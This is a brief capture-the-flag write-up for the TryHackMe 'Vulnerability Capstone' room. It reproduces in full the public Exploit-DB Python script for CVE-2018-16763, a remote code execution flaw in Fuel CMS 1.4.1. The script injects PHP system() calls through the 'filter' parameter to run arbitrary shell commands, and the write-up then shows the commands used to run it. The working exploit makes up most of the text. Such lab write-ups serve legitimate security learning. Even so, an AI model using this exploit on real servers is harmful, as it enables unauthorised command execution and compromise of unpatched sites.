[Vulnerability Capstone](https://tryhackme.com/room/vulnerabilitycapstone)

*Apply the knowledge gained throughout the Vulnerability Module in this challenge room.*

<img width="959" alt="image" src="https://github.com/user-attachments/assets/91e456f5-2524-4bcf-a59d-8e1b74898f40" />

<img width="959" alt="image" src="https://github.com/user-attachments/assets/f7a8e60f-cbd5-4292-ab8d-d72b02e43f93" />

[CVE-2018-16763 Detail](https://nvd.nist.gov/vuln/detail/CVE-2018-16763)

[fuel CMS 1.4.1 - Remote Code Execution (1)](https://www.exploit-db.com/exploits/47138)

```
# Exploit Title: fuel CMS 1.4.1 - Remote Code Execution (1)
# Date: 2019-07-19
# Exploit Author: 0xd0ff9
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763


import requests
import urllib

url = "http://127.0.0.1:8881"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
	xxxx = raw_input('cmd:')
	burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"
	proxy = {"http":"http://127.0.0.1:8080"}
	r = requests.get(burp0_url, proxies=proxy)

	html = "<!DOCTYPE html>"
	htmlcharset = r.text.find(html)

	begin = r.text[0:20]
	dup = find_nth_overlapping(r.text,begin,2)

	print r.text[0:dup]
```

```
nano 47138.py
```

<img width="959" alt="image" src="https://github.com/user-attachments/assets/e5e52303-d3a1-4aa7-b62d-e9a2fa0e0dbf" />

```
python 47138.py
```

<img width="956" alt="image" src="https://github.com/user-attachments/assets/a2b79f16-aac5-461c-aab4-0ae0843f3623" />

![image](https://github.com/user-attachments/assets/b6d385c6-6614-4c62-8991-88e40fd722f3)
